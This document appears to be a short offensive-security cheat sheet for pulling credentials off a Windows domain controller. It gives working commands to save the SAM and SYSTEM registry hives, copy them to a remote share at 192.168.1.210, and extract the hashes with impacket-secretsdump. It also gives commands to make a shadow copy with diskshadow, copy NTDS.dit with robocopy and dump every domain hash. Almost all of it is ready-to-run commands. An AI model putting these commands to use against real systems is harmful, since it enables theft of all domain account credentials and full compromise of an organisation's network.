# Local SAM Database extraction

We can take a copy of the HKLM SAM and SYSTEM hives

```powershell
[DC01]:> reg save hklm\sam c:\Windows\Temp\SAM
The operation completed successfully.

[DC01]:> reg save hklm\system c:\Windows\Temp\SYSTEM
The operation completed successfully.

[DC01]:> copy SAM \\192.168.1.210\shared\SAM
[DC01]:> copy SYSTEM \\192.168.1.210\shared\SYSTEM
```

```powershell
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

# Dumping the NTDS.dit

### Using diskshadow

Create a txt file contains commands if you don't have interactive shell.

```powershell
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

Use diskshadow.

```powershell
diskshadow.exe /s c:\temp\diskshadow.txt
```

Now the Z: is ready to use.

```powershell
cd Z:\windows\ntds
robocopy /b .\ C:\temp NTDS.dit
```

Grab it and get hashes

```bash
secretsdump.py -ntds ntds.dit -system system.bak LOCAL > hashes.txt
```
